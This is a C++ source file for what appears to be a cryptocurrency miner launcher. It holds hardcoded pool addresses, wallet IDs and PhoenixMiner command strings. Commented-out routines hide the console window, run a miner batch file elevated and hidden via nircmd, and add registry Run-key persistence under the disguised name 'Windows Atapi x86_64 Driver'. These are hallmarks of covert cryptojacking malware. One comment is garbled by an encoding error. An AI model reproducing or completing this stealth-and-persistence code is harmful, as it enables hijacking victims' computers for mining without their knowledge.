#include "include/COIN.h"
#include "include/API.h"
#pragma warning(disable : 4996)

//const char* ETH = "";
//const char* ETC = "nircmd elevatecmd exec hide " % AppData % \Microsoft\Windows\start_miner.bat"";

char start;
char message[1000];	
char ANG[1000];
const char* cionname = "zhulele03.PC002";
const char* ssl = "stratum+tcp://es.huobipool.com:1800\
";

const char* ETC = "miner.exe --algo etchash  --server etc-pool.beepool.org:9518 --user zhuxs.PC01";
const char* CP = "notepad.exe";




//void guanbi() {
//	HWND hwndDOS = GetForegroundWindow();
//	ShowWindow(hwndDOS, SW_HIDE);
//}
//


void ETH(const char* ssl, const char* coinname) {
	char text10[] = "PhoenixMiner.exe -pool %s -wal %s -dagrestart 1 -rvram -1 -eres 0";
	memset(message, 0, sizeof(text10));
	sprintf(message, text10, ssl, coinname);
	//cout << start << message << endl;
}



//void ETHS()
//{
//	char ETHT[] = "nircmd elevatecmd exec hide\" % AppData % \Microsoft\Windows\start_miner.bat\"";
//	
//}


void setcolor(unsigned short color)
{
	HANDLE hcon = GetStdHandle(STD_OUTPUT_HANDLE);
	SetConsoleTextAttribute(hcon, color);
}


//string userlc;
//¿ª»ú×ÔÆô¶¯
//void AutoStart()
//{
//	char Driver[MAX_PATH];
//	HKEY hKey;
//	string ff_path = userlc + "ETH-MIAN.exe";
//	strcpy(Driver, ff_path.c_str());
//	RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
//	RegSetValueExA(hKey, "Windows Atapi x86_64 Driver", 0, REG_SZ, (const unsigned char*)Driver, MAX_PATH);
//	RegCloseKey(hKey);
//}








